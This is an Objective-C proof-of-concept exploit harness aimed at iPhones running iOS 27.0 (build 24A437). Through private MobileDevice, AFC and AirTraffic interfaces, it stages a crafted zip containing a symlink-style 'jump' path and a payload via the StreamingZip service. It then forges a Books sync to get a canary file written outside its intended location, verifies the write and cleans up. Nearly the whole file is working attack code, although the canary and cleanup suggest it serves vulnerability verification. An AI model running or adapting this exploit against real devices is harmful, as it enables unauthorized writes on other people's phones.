#import <Foundation/Foundation.h>
#include <signal.h>
#include <sys/socket.h>
#include <unistd.h>

// Small declarations for the private Mac frameworks used by this PoC.
typedef const void *DeviceRef;
typedef const void *NotificationRef;
typedef void *ServiceRef;
typedef void *AFCRef;
typedef void *AFCInfoRef;
typedef void *AFCFileRef;
typedef void *AFCDirRef;
typedef void *ATRef;
typedef struct { DeviceRef device; unsigned int message; } DeviceEvent;

extern int AMDeviceNotificationSubscribeWithOptions(void (*)(DeviceEvent *, void *),
    int, unsigned int, void *, NotificationRef *, CFDictionaryRef);
extern int AMDeviceNotificationUnsubscribe(NotificationRef);
extern CFStringRef AMDeviceCopyDeviceIdentifier(DeviceRef);
extern CFTypeRef AMDeviceCopyValue(DeviceRef, CFStringRef, CFStringRef);
extern int AMDeviceConnect(DeviceRef);
extern int AMDeviceDisconnect(DeviceRef);
extern int AMDeviceIsPaired(DeviceRef);
extern int AMDeviceValidatePairing(DeviceRef);
extern int AMDeviceStartSession(DeviceRef);
extern int AMDeviceStopSession(DeviceRef);
extern int AMDeviceSecureStartService(DeviceRef, CFStringRef, CFDictionaryRef, ServiceRef *);
extern int AMDServiceConnectionGetSocket(ServiceRef);
extern void *AMDServiceConnectionGetSecureIOContext(ServiceRef);
extern int AMDServiceConnectionInvalidate(ServiceRef);
extern int AMDServiceConnectionSend(ServiceRef, const void *, size_t);
extern int AMDServiceConnectionSendMessage(ServiceRef, CFTypeRef, CFPropertyListFormat);
extern int AMDServiceConnectionReceiveMessage(ServiceRef, CFTypeRef *, CFPropertyListFormat *);
extern int AFCConnectionOpen(int, unsigned int, AFCRef *);
extern int AFCConnectionClose(AFCRef);
extern int AFCConnectionSetSecureContext(AFCRef, void *);
extern int AFCConnectionSetDisposeSecureContextOnInvalidate(AFCRef, int);
extern int AFCConnectionSetIOTimeout(AFCRef, unsigned int);
extern int AFCFileInfoOpen(AFCRef, const char *, AFCInfoRef *);
extern int AFCKeyValueRead(AFCInfoRef, char **, char **);
extern int AFCKeyValueClose(AFCInfoRef);
extern int AFCFileRefOpen(AFCRef, const char *, unsigned long long, AFCFileRef *);
extern int AFCFileRefRead(AFCRef, AFCFileRef, void *, long *);
extern int AFCFileRefWrite(AFCRef, AFCFileRef, const void *, long);
extern int AFCFileRefClose(AFCRef, AFCFileRef);
extern int AFCDirectoryOpen(AFCRef, const char *, AFCDirRef *);
extern int AFCDirectoryRead(AFCRef, AFCDirRef, char **);
extern int AFCDirectoryClose(AFCRef, AFCDirRef);
extern int AFCDirectoryCreate(AFCRef, const char *);
extern int AFCRemovePath(AFCRef, const char *);
extern ATRef ATHostConnectionCreate(CFStringRef);
extern void ATHostConnectionRelease(ATRef);
extern void ATHostConnectionSendHostInfo(ATRef, CFDictionaryRef);
extern void ATHostConnectionSendSyncRequest(ATRef, CFArrayRef, CFDictionaryRef, CFDictionaryRef);
extern void ATHostConnectionSendMetadataSyncFinished(ATRef, CFDictionaryRef, CFDictionaryRef);
extern void ATHostConnectionSendAssetCompleted(ATRef, CFStringRef, CFStringRef, CFStringRef);
extern CFDictionaryRef ATHostConnectionReadMessage(ATRef);
extern CFStringRef ATCFMessageGetName(CFDictionaryRef);
extern CFTypeRef ATCFMessageGetParam(CFDictionaryRef, CFStringRef);

typedef struct { DeviceRef device; ServiceRef service; AFCRef afc; BOOL connected; BOOL started; } Session;
static CFStringRef wanted;
static DeviceRef found;

static void print_json(NSDictionary *row) {
    NSData *bytes = [NSJSONSerialization dataWithJSONObject:row options:0 error:nil];
    if (bytes) {
        fwrite(bytes.bytes, 1, bytes.length, stdout);
        fputc('\n', stdout);
        fflush(stdout);
    }
}

static int error_out(NSString *message) {
    fprintf(stderr, "%s\n", message.UTF8String);
    print_json(@{ @"ok": @NO, @"error": message });
    return 2;
}

static BOOL generated(NSString *name, NSString *prefix) {
    if (![name hasPrefix:prefix] || name.length != prefix.length + 20) return NO;
    for (NSUInteger i = prefix.length; i < name.length; i++) {
        unichar c = [name characterAtIndex:i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) return NO;
    }
    return YES;
}

static BOOL names_ok(NSString *source, NSString *link, NSString *readback) {
    if (!generated(source, @"cl-src-") || !generated(link, @"cl-link-") ||
        !generated(readback, @"cl-read-")) return NO;
    return [[source substringFromIndex:7] isEqual:[link substringFromIndex:8]] &&
           [[source substringFromIndex:7] isEqual:[readback substringFromIndex:8]];
}

static void device_event(DeviceEvent *event, void *unused) {
    (void)unused;
    if (!event || event->message != 1 || !event->device || found) return;
    CFStringRef identifier = AMDeviceCopyDeviceIdentifier(event->device);
    if (identifier && CFEqual(identifier, wanted)) found = CFRetain(event->device);
    if (identifier) CFRelease(identifier);
    if (found) CFRunLoopStop(CFRunLoopGetMain());
}

static BOOL open_session(Session *s, NSString *udid) {
    memset(s, 0, sizeof(*s));
    wanted = (__bridge CFStringRef)udid;
    NSDictionary *options = @{
        @"NotificationOptionSearchForPairedDevices": @YES,
        @"NotificationOptionSearchForPairedDevicesViaDirectConnectionsOnly": @YES,
        @"NotificationOptionSearchForWiFiPairableDevices": @NO,
        @"NotificationOptionEnableUSBMux": @YES,
    };
    NotificationRef note = NULL;
    int status = AMDeviceNotificationSubscribeWithOptions(device_event, 0, 0, NULL,
        &note, (__bridge CFDictionaryRef)options);
    if (status == 0 && !found) CFRunLoopRunInMode(kCFRunLoopDefaultMode, 12, false);
    if (note) AMDeviceNotificationUnsubscribe(note);
    s->device = found;
    if (!s->device || AMDeviceConnect(s->device) != 0) return NO;
    s->connected = YES;
    if (!AMDeviceIsPaired(s->device) || AMDeviceValidatePairing(s->device) != 0 ||
        AMDeviceStartSession(s->device) != 0) return NO;
    s->started = YES;
    NSString *version = CFBridgingRelease(AMDeviceCopyValue(s->device, NULL, CFSTR("ProductVersion")));
    NSString *build = CFBridgingRelease(AMDeviceCopyValue(s->device, NULL, CFSTR("BuildVersion")));
    NSString *product = CFBridgingRelease(AMDeviceCopyValue(s->device, NULL, CFSTR("ProductType")));
    if (![product hasPrefix:@"iPhone"] || ![version isEqual:@"27.0"] ||
        ![build isEqual:@"24A437"]) return NO;
    if (AMDeviceSecureStartService(s->device, CFSTR("com.apple.afc"), NULL,
        &s->service) != 0 || !s->service) return NO;
    if (AFCConnectionOpen(AMDServiceConnectionGetSocket(s->service), 0, &s->afc) != 0 ||
        !s->afc) return NO;
    void *secure = AMDServiceConnectionGetSecureIOContext(s->service);
    if (secure) {
        AFCConnectionSetSecureContext(s->afc, secure);
        AFCConnectionSetDisposeSecureContextOnInvalidate(s->afc, 0);
    }
    AFCConnectionSetIOTimeout(s->afc, 20);
    return YES;
}

static void close_session(Session *s) {
    if (s->afc) AFCConnectionClose(s->afc);
    if (s->service) AMDServiceConnectionInvalidate(s->service);
    if (s->started) AMDeviceStopSession(s->device);
    if (s->connected) AMDeviceDisconnect(s->device);
    if (s->device) CFRelease(s->device);
    found = NULL;
}

static NSString *kind(AFCRef afc, NSString *path) {
    AFCInfoRef info = NULL;
    if (AFCFileInfoOpen(afc, path.fileSystemRepresentation, &info) != 0 || !info)
        return nil;
    NSString *result = nil;
    char *key = NULL, *value = NULL;
    while (AFCKeyValueRead(info, &key, &value) == 0 && key && value) {
        if (strcmp(key, "st_ifmt") == 0) result = [NSString stringWithUTF8String:value];
        key = value = NULL;
    }
    AFCKeyValueClose(info);
    return result;
}

static BOOL exists(AFCRef afc, NSString *path) { return kind(afc, path) != nil; }

static NSData *read_file(AFCRef afc, NSString *path, NSUInteger limit) {
    AFCInfoRef info = NULL;
    if (AFCFileInfoOpen(afc, path.fileSystemRepresentation, &info) != 0 || !info)
        return nil;
    long long size = -1;
    char *key = NULL, *value = NULL;
    while (AFCKeyValueRead(info, &key, &value) == 0 && key && value) {
        if (strcmp(key, "st_size") == 0) size = strtoll(value, NULL, 10);
        key = value = NULL;
    }
    AFCKeyValueClose(info);
    if (size < 0 || (unsigned long long)size > limit) return nil;
    AFCFileRef file = NULL;
    if (AFCFileRefOpen(afc, path.fileSystemRepresentation, 1, &file) != 0 || !file)
        return nil;
    NSMutableData *data = [NSMutableData dataWithLength:(NSUInteger)size];
    int status = 0;
    long long offset = 0;
    while (offset < size) {
        long count = (long)(size - offset);
        status = AFCFileRefRead(afc, file, (uint8_t *)data.mutableBytes + offset, &count);
        if (status != 0 || count <= 0 || count > size - offset) break;
        offset += count;
    }
    int closed = AFCFileRefClose(afc, file);
    return status == 0 && closed == 0 && offset == size ? data : nil;
}

static BOOL write_file(AFCRef afc, NSString *path, NSData *data) {
    AFCFileRef file = NULL;
    if (AFCFileRefOpen(afc, path.fileSystemRepresentation, 3, &file) != 0 || !file)
        return NO;
    int status = AFCFileRefWrite(afc, file, data.bytes, (long)data.length);
    int closed = AFCFileRefClose(afc, file);
    return status == 0 && closed == 0;
}

static BOOL remove_path(AFCRef afc, NSString *path) {
    if (!exists(afc, path)) return YES;
    return AFCRemovePath(afc, path.fileSystemRepresentation) == 0 && !exists(afc, path);
}

static NSArray<NSString *> *book_files(void) {
    return @[
        @"Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
        @"Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
        @"Books/Sync/Database/OutstandingAssets_4.sqlite",
        @"Books/Sync/Upload.plist", @"Books/Sync/Books.plist", @"Books/Books.plist"
    ];
}

static BOOL preflight(AFCRef afc, NSString *source, NSString *link, NSString *readback,
    BOOL *books, BOOL *sync, BOOL *database) {
    BOOL names = names_ok(source, link, readback);
    BOOL fresh = !exists(afc, source) && !exists(afc, link) &&
        !exists(afc, readback);
    BOOL filesAbsent = YES;
    for (NSString *path in book_files())
        if (exists(afc, path)) filesAbsent = NO;
    NSString *booksKind = kind(afc, @"Books");
    NSString *syncKind = kind(afc, @"Books/Sync");
    NSString *databaseKind = kind(afc, @"Books/Sync/Database");
    BOOL validDirs = (!booksKind || [booksKind isEqual:@"S_IFDIR"]) &&
        (!syncKind || [syncKind isEqual:@"S_IFDIR"]) &&
        (!databaseKind || [databaseKind isEqual:@"S_IFDIR"]);
    if (!names || !fresh || !filesAbsent || !validDirs) {
        fprintf(stderr, "preflight: names=%d fresh=%d Books files absent=%d "
            "Books=%s Sync=%s Database=%s\n", names, fresh, filesAbsent,
            booksKind.UTF8String ?: "absent", syncKind.UTF8String ?: "absent",
            databaseKind.UTF8String ?: "absent");
        return NO;
    }
    *books = booksKind != nil;
    *sync = syncKind != nil;
    *database = databaseKind != nil;
    return YES;
}

static BOOL send_bytes(ServiceRef service, NSData *data) {
    const uint8_t *cursor = data.bytes;
    size_t left = data.length;
    while (left) {
        int n = AMDServiceConnectionSend(service, cursor, left);
        if (n <= 0) return NO;
        cursor += n;
        left -= (size_t)n;
    }
    return YES;
}

static int stage(Session *s, NSString *source, NSString *link, NSString *readback,
    NSString *zipPath, NSString *booksPath) {
    BOOL oldBooks = NO, oldSync = NO, oldDatabase = NO;
    if (!preflight(s->afc, source, link, readback, &oldBooks, &oldSync, &oldDatabase))
        return error_out(@"stage preflight failed; existing Books state or generated path");
    NSData *zip = [NSData dataWithContentsOfFile:zipPath];
    NSData *books = [NSData dataWithContentsOfFile:booksPath];
    if (!zip.length || zip.length > 1024 * 1024 || !books.length || books.length > 4096)
        return error_out(@"local staging inputs invalid");

    ServiceRef service = NULL;
    if (AMDeviceSecureStartService(s->device, CFSTR("com.apple.streaming_zip_conduit"),
        NULL, &service) != 0 || !service) return error_out(@"StreamingZip unavailable");
    int message = AMDServiceConnectionSendMessage(service,
        (__bridge CFTypeRef)@{ @"MediaSubdir": source }, kCFPropertyListBinaryFormat_v1_0);
    BOOL sent = message == 0 && send_bytes(service, zip);
    int responseStatus = -1;
    if (sent) {
        int socket = AMDServiceConnectionGetSocket(service);
        struct timeval timeout = { .tv_sec = 20, .tv_usec = 0 };
        setsockopt(socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        CFTypeRef reply = NULL;
        CFPropertyListFormat format = kCFPropertyListBinaryFormat_v1_0;
        responseStatus = AMDServiceConnectionReceiveMessage(service, &reply, &format);
        if (reply) CFRelease(reply);
    }
    AMDServiceConnectionInvalidate(service);
    NSString *jump = [source stringByAppendingPathComponent:@"a/b/c/jump"];
    NSString *payload = [source stringByAppendingPathComponent:@"payload"];
    BOOL extracted = exists(s->afc, jump) && exists(s->afc, payload);
    if (!sent || !extracted) return error_out(@"StreamingZip did not extract expected objects");
    if ((!oldBooks && AFCDirectoryCreate(s->afc, "Books") != 0) ||
        (!oldSync && AFCDirectoryCreate(s->afc, "Books/Sync") != 0) ||
        !write_file(s->afc, @"Books/Sync/Books.plist", books))
        return error_out(@"could not stage Books metadata");
    print_json(@{ @"ok": @YES, @"zipResponseStatus": @(responseStatus) });
    return 0;
}

static void timeout_handler(int number) { (void)number; _exit(124); }

static BOOL wait_for(ATRef at, NSString *wantedName, NSUInteger maximum) {
    for (NSUInteger i = 0; i < maximum; i++) {
        CFDictionaryRef message = ATHostConnectionReadMessage(at);
        if (!message) continue;
        NSString *name = (__bridge NSString *)ATCFMessageGetName(message);
        BOOL match = [name isEqual:wantedName];
        CFRelease(message);
        if (match) return YES;
    }
    return NO;
}

static BOOL manifest_has(NSDictionary *manifest, NSString *identifier) {
    NSArray *rows = [manifest[@"Book"] isKindOfClass:NSArray.class] ? manifest[@"Book"] : nil;
    for (id row in rows) {
        if ([row isKindOfClass:NSDictionary.class] &&
            [row[@"AssetID"] isEqual:identifier] && [row[@"IsDownload"] boolValue])
            return YES;
    }
    return NO;
}

static int sync_assets(NSString *udid, NSArray<NSString *> *args) {
    signal(SIGALRM, timeout_handler);
    alarm(90);
    ATRef at = ATHostConnectionCreate((__bridge CFStringRef)udid);
    if (!at) return error_out(@"AirTraffic connection failed");
    BOOL allowed = wait_for(at, @"SyncAllowed", 8);
    if (!allowed) { ATHostConnectionRelease(at); return error_out(@"SyncAllowed missing"); }
    NSDictionary *info = @{
        @"Type": @"iTunes", @"Version": @"13.7.0.161",
        @"MacOSVersion": NSProcessInfo.processInfo.operatingSystemVersionString,
        @"SyncHostName": @"airlift-cleanroom", @"LibraryID": NSUUID.UUID.UUIDString,
        @"SyncedDataclasses": @[ @"Book" ], @"SyncedAssetTypes": @[ @"Book" ],
        @"Wakeable": @NO,
    };
    ATHostConnectionSendHostInfo(at, (__bridge CFDictionaryRef)info);
    usleep(200000);
    ATHostConnectionSendSyncRequest(at, (__bridge CFArrayRef)@[ @"Book" ],
        (__bridge CFDictionaryRef)@{}, (__bridge CFDictionaryRef)info);
    if (!wait_for(at, @"ReadyForSync", 12)) {
        ATHostConnectionRelease(at); return error_out(@"ReadyForSync missing");
    }
    ATHostConnectionSendMetadataSyncFinished(at,
        (__bridge CFDictionaryRef)@{ @"Book": @1 }, (__bridge CFDictionaryRef)@{});
    NSDictionary *manifest = nil;
    for (int i = 0; i < 20; i++) {
        CFDictionaryRef message = ATHostConnectionReadMessage(at);
        if (!message) continue;
        NSString *name = (__bridge NSString *)ATCFMessageGetName(message);
        if ([name isEqual:@"AssetManifest"]) {
            id value = (__bridge id)ATCFMessageGetParam(message, CFSTR("AssetManifest"));
            if ([value isKindOfClass:NSDictionary.class]) manifest = [value copy];
        }
        BOOL done = [name isEqual:@"SyncFinished"] || [name isEqual:@"SyncFailed"];
        CFRelease(message);
        if (manifest || done) break;
    }
    BOOL ready = manifest != nil;
    for (int i = 0; i < 6 && ready; i += 2)
        ready = manifest_has(manifest, args[i]);
    if (!ready) {
        ATHostConnectionRelease(at); return error_out(@"Book assets missing from manifest");
    }
    fputs("{\"ok\":true,\"manifestAssets\":3,\"completionMessagesPlanned\":3}\n", stderr);
    fflush(stderr);
    for (int i = 0; i < 6; i += 2) {
        ATHostConnectionSendAssetCompleted(at, (__bridge CFStringRef)args[i],
            CFSTR("Book"), (__bridge CFStringRef)args[i + 1]);
        if (i < 4) usleep(900000);
    }
    sleep(2);
    ATHostConnectionRelease(at);
    alarm(0);
    return 0;
}

static int finish(Session *s, NSString *source, NSString *link, NSString *readback,
    NSString *leaf, NSString *expectedPath, BOOL oldBooks, BOOL oldSync,
    BOOL oldDatabase, BOOL poll) {
    NSString *token = [source substringFromIndex:7];
    if (!names_ok(source, link, readback) ||
        ![leaf isEqual:[NSString stringWithFormat:@"cl-canary-%@.bin", token]])
        return error_out(@"generated names do not match");
    NSData *expected = [NSData dataWithContentsOfFile:expectedPath];
    if (!expected.length || expected.length > 4096) return error_out(@"expected bytes missing");

    NSData *observed = nil;
    int attempts = poll ? 60 : 1;
    for (int i = 0; i < attempts; i++) {
        observed = read_file(s->afc, readback, 4096);
        if ([observed isEqual:expected]) break;
        if (i + 1 < attempts) usleep(250000);
    }
    BOOL matched = [observed isEqual:expected];
    NSMutableArray<NSString *> *failures = NSMutableArray.array;
    NSString *throughLink = [link stringByAppendingPathComponent:leaf];
    NSData *outside = read_file(s->afc, throughLink, 4096);
    BOOL ownershipUncertain = exists(s->afc, throughLink) && ![outside isEqual:expected];
    if (ownershipUncertain)
        [failures addObject:@"canary ownership uncertain"];
    else if (!remove_path(s->afc, throughLink))
        [failures addObject:@"canary"];
    if (!ownershipUncertain && !remove_path(s->afc, link))
        [failures addObject:@"moved symlink"];
    if (!remove_path(s->afc, readback)) [failures addObject:@"readback"];

    NSArray<NSString *> *inside = @[
        @"payload", @"a/b/c/jump", @"a/b/c", @"a/b", @"a",
        @"var/tmp", @"var", @"META-INF/com.apple.ZipMetadata.plist", @"META-INF"
    ];
    for (NSString *part in inside) {
        NSString *path = [source stringByAppendingPathComponent:part];
        if (!remove_path(s->afc, path)) [failures addObject:path];
    }
    if (!remove_path(s->afc, source)) [failures addObject:@"source tree"];

    for (NSString *path in book_files())
        if (!remove_path(s->afc, path)) [failures addObject:path];
    if (!oldDatabase && !remove_path(s->afc, @"Books/Sync/Database"))
        [failures addObject:@"Books database directory"];
    if (!oldSync && !remove_path(s->afc, @"Books/Sync"))
        [failures addObject:@"Books sync directory"];
    if (!oldBooks && !remove_path(s->afc, @"Books"))
        [failures addObject:@"Books directory"];

    BOOL clean = failures.count == 0 && !exists(s->afc, source) &&
        !exists(s->afc, link) && !exists(s->afc, readback) &&
        !exists(s->afc, throughLink) &&
        (exists(s->afc, @"Books") == oldBooks) &&
        (exists(s->afc, @"Books/Sync") == oldSync) &&
        (exists(s->afc, @"Books/Sync/Database") == oldDatabase);
    for (NSString *path in book_files())
        if (exists(s->afc, path)) clean = NO;
    NSDictionary *row = @{ @"ok": @(clean), @"bytesMatch": @(matched),
        @"cleanupComplete": @(clean), @"cleanupFailures": failures };
    print_json(row);
    return clean ? 0 : 3;
}

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        if (argc < 3) return error_out(@"usage: host mode UDID ...");
        NSString *mode = [NSString stringWithUTF8String:argv[1]];
        NSString *udid = [NSString stringWithUTF8String:argv[2]];
        if ([mode isEqual:@"sync"]) {
            if (argc != 9) return error_out(@"sync needs three identifier/path pairs");
            NSMutableArray *args = NSMutableArray.array;
            for (int i = 3; i < argc; i++) [args addObject:[NSString stringWithUTF8String:argv[i]]];
            return sync_assets(udid, args);
        }
        Session session;
        BOOL opened = open_session(&session, udid);
        if (!opened) { close_session(&session); return error_out(@"USB/AFC or iOS 27.0 (24A437) gate failed"); }
        int result = 64;
        if ([mode isEqual:@"preflight"] && argc == 6) {
            NSString *source = [NSString stringWithUTF8String:argv[3]];
            NSString *link = [NSString stringWithUTF8String:argv[4]];
            NSString *readback = [NSString stringWithUTF8String:argv[5]];
            BOOL books = NO, sync = NO, database = NO;
            BOOL safe = preflight(session.afc, source, link, readback,
                &books, &sync, &database);
            if (safe) print_json(@{ @"ok": @YES, @"booksExisted": @(books),
                @"syncExisted": @(sync), @"databaseExisted": @(database) });
            else result = error_out(@"existing Books state or generated path blocks test");
            if (safe) result = 0;
        } else if ([mode isEqual:@"stage"] && argc == 8) {
            result = stage(&session, [NSString stringWithUTF8String:argv[3]],
                [NSString stringWithUTF8String:argv[4]],
                [NSString stringWithUTF8String:argv[5]],
                [NSString stringWithUTF8String:argv[6]],
                [NSString stringWithUTF8String:argv[7]]);
        } else if ([mode isEqual:@"finish"] && argc == 12) {
            NSString *booksFlag = [NSString stringWithUTF8String:argv[8]];
            NSString *syncFlag = [NSString stringWithUTF8String:argv[9]];
            NSString *databaseFlag = [NSString stringWithUTF8String:argv[10]];
            NSString *pollFlag = [NSString stringWithUTF8String:argv[11]];
            if (([booksFlag isEqual:@"0"] || [booksFlag isEqual:@"1"]) &&
                ([syncFlag isEqual:@"0"] || [syncFlag isEqual:@"1"]) &&
                ([databaseFlag isEqual:@"0"] || [databaseFlag isEqual:@"1"]) &&
                ([pollFlag isEqual:@"0"] || [pollFlag isEqual:@"1"]))
                result = finish(&session, [NSString stringWithUTF8String:argv[3]],
                    [NSString stringWithUTF8String:argv[4]],
                    [NSString stringWithUTF8String:argv[5]],
                    [NSString stringWithUTF8String:argv[6]],
                    [NSString stringWithUTF8String:argv[7]], booksFlag.boolValue,
                    syncFlag.boolValue, databaseFlag.boolValue, pollFlag.boolValue);
            else result = error_out(@"invalid finish flags");
        } else result = error_out(@"unknown mode or wrong argument count");
        close_session(&session);
        return result;
    }
}
